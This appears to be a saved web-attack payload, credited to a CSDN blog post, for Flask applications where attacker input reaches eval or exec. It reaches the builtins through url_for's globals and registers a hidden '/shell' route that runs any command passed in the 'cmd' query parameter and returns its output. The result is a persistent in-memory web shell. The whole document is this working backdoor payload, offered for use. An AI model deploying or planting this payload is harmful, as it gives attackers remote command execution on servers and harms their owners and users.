#by bfengj

#原文地址: https://blog.csdn.net/rfrder/article/details/121005608
#适用于eval、exec等函数

#Payload:
if False:
	url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})